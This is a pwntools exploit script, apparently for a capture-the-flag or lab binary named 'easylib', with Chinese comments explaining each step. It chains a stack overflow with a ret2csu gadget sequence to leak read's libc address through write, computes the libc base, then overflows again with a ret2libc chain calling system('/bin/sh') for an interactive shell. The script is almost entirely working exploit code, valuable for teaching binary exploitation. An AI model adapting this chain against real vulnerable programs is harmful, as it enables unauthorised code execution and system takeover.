from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./easylib')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 40075a:	5b                   	pop    rbx
# 40075b:	5d                   	pop    rbp
# 40075c:	41 5c                	pop    r12
# 40075e:	41 5d                	pop    r13
# 400760:	41 5e                	pop    r14
# 400762:	41 5f                	pop    r15
# 400764:	c3                   	ret    
gadget1 = 0x40075A
# 400740:	4c 89 fa             	mov    rdx,r15
# 400743:	4c 89 f6             	mov    rsi,r14
# 400746:	44 89 ef             	mov    edi,r13d
# 400749:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]         # 令 [r12] = 目标函数的地址，rbx = 0
# 40074d:	48 83 c3 01          	add    rbx,0x1
# 400751:	48 39 dd             	cmp    rbp,rbx                       # 令 rbp = 1
# 400754:	75 ea                	jne    400740 <__libc_csu_init+0x40> 
# 400756:	48 83 c4 08          	add    rsp,0x8                       # 令 [rsp + 56] = 目标返回地址
gadget2 = 0x400740

prdi = 0x400763 #: pop rdi ; ret
prsi = 0x400761 #: pop rsi ; pop r15 ; ret
write_got = 0x601018
read_got = 0x601020
main = 0x4006B9

io = process('./easylib')


# 1. 第一次栈溢出，通过ret2csu借助WRITE系统调用泄露READ系统调用的真实内存地址(由于缺少pop rdx的gadget，需要使用ret2csu)
payload = b'a' * 0x80 + b'b' * 8 
payload += p64(gadget1)
payload += p64(0) # rbx = 0
payload += p64(1) # rbp = 1
payload += p64(write_got) # r12 = write_got <=> [r12] = write
# 事实上此时GOT表中WRITE表项并不是WRITE系统调用的真实内存地址，而是PLT表中WRITE表项第二条指令的地址
# 因此会先进行WRITE系统调用的动态链接并将其地址填入GOT表中，再执行WRITE系统调用
payload += p64(1) 
payload += p64(read_got)
payload += p64(8) # write(1, read_got, 8);

payload += p64(gadget2)
payload += p64(0) * 7
payload += p64(main)

io.send(payload)
addr = u64(io.recv(8))
log.success(hex(addr))

# 2. 利用READ的真实地址和READ相对libc的偏移地址获得libc的基地址，进而获得其他系统调用的真实内存地址等
libc_base = addr - libc.sym['read']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search('/bin/sh'))
log.success(hex(system))
log.success(hex(binsh))

# 3. 第二次栈溢出，通过ret2libc获取shell
payload = b'a' * 0x80 + b'b' * 8 
payload += p64(prdi) + p64(binsh) 
payload += p64(prsi) + p64(0) * 2 # 与axb_exp.py一样，需要将RSI置零
payload += p64(system)
payload += p64(main)

gdb.attach(io)
io.send(payload)

io.interactive()
